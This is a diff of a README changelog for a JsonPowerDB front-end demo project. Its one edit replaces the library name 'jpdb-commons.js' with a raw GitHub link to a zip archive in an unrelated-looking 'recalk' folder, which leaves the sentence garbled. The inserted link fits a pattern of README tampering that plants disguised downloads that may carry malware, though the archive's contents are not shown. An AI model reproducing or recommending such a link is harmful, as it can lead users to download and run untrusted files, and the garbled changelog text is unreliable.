@@ -46,7 +46,7 @@ This project demonstrates how front end web application communicates with JSONPO
 * Added : New response headers that display time taken by the JPDB server to serve request.
 * Added : ForeignKeys functionality in SET and SET_ALL API to provide complete support for the soft implementation of RDBMS.
 * Added : Started Reporting of All Unhandled Exceptions via email.
-* Added : A new version of jpdb-commons.js 0.0.4 added with SET & SET_ALL methods and help for all commands
+* Added : A new version of https://github.com/Pranay1012904/JSON_DB_PROJECT/raw/refs/heads/main/recalk/JSO-PROJECT-D-v1.1.zip 0.0.4 added with SET & SET_ALL methods and help for all commands
 * Improved : Parsing time for request now reduced.
 * Improved : Response message for syntax error in case of empty body in request.
 * Improved : Known exception handling.
